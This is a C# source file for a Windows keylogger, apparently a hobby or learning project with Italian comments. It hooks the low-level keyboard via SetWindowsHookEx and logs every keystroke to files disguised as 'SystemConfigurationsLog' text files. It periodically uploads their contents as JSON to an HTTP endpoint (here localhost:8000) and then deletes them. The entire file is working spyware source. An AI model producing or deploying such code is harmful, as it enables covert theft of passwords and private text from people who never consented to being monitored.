using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Windows.Forms;
using System.IO;
using System.Net.Http;
using System.Net;
using System.Text;
using Newtonsoft.Json;
using System.Runtime.CompilerServices;


namespace keylogger
{
    internal class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static readonly HttpClient client = new HttpClient();

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;
        private static int WM_SYSKEYDOWN = 0x104;

        public static void Main(string[] args)
        {
            HookCallbackDelegate hcDelegate = HookCallback;

            string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
            IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

            System.Windows.Forms.Application.Run();

        }

        private static int wordCounter = 0;
        private static int fileCounter = 0;
        private static string actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";
        private static Dictionary<string, string> dizionario = new Dictionary<string, string>
        {
            {"D0", "0"},
            {"D1", "1"},
            {"D2", "2"},
            {"D3", "3"},
            {"D4", "4"},
            {"D5", "5"},
            {"D6", "6"},
            {"D7", "7"},
            {"D8", "8"},
            {"D9", "9"},
            {"Enter", "\n"},
            {"Space", " "},
            {"Back", "[Back]" },


        };

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            
            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Write($"[{(Keys)vkCode}]");
                if (wordCounter > 10)
                {
                    NewMethod();
                    File.Delete(actualFile);
                    wordCounter = 0;
                    fileCounter++;
                    actualFile = "SystemConfigurationsLog_" + fileCounter.ToString() + ".txt";
                }
                InsertKey(vkCode);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static async Task NewMethod()
        {
            var jsonData = new
            {
                title = actualFile,
                text = File.ReadAllLines(actualFile)
            };

            string url = "http://localhost:8000";

            using (WebClient client = new WebClient())
            {
                client.Headers[HttpRequestHeader.ContentType] = "application/json";

                // Converti l'oggetto JSON in una stringa
                string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);

                // Invia la richiesta POST
                string response = client.UploadString(url, "POST", jsonString);

                // Stampa la risposta del server
                Console.WriteLine("Risposta del server:");
                Console.WriteLine(response);
            }
        }

        private static void InsertKey(int vkCode)
        {
            if (dizionario.ContainsKey($"{(Keys)vkCode}"))
                File.AppendAllText(actualFile, dizionario[$"{(Keys)vkCode}"]);
            else
                File.AppendAllText(actualFile, $"{(Keys)vkCode}");

            wordCounter++;
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

    }
}
